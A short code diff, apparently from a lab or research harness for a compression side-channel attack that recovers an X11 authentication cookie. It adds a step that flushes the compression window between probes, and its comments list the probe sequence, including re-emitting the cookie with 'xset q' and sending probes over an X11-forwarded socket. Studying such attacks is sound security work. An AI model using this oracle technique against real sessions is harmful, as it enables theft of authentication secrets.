@@ -22,6 +22,20 @@ MAX_ROUNDS = int(os.environ.get("MAX_ROUNDS", "16"))
 
 def _make_oracle(target_port: int, http: aiohttp.ClientSession):
     async def oracle(prefix: bytes, candidate: bytes, align_len: int) -> int:
+        # Per-measurement sequence:
+        #   1. /flush — push 40 KiB of base64 random bytes through the bash
+        #      session, evicting any prior probe + cookie content from the
+        #      LZ77 32 KiB window. Critical: without this, probe N's bytes
+        #      remain in the window for probe N+1, and zlib finds back-
+        #      references to the previous probe rather than to the cookie.
+        #   2. /trigger — re-emit the cookie via xset q, so the only thing
+        #      the next probe can match against in the window is the cookie.
+        #   3. clear pcap log
+        #   4. send probe via X11 forward TCP socket
+        #   5. settle + snapshot
+        async with http.post(f"{HARNESS_URL}/flush") as r:
+            if r.status != 200:
+                raise RuntimeError(f"harness /flush returned {r.status}")
         async with http.post(f"{HARNESS_URL}/trigger") as r:
             if r.status != 200:
                 raise RuntimeError(f"harness /trigger returned {r.status}")
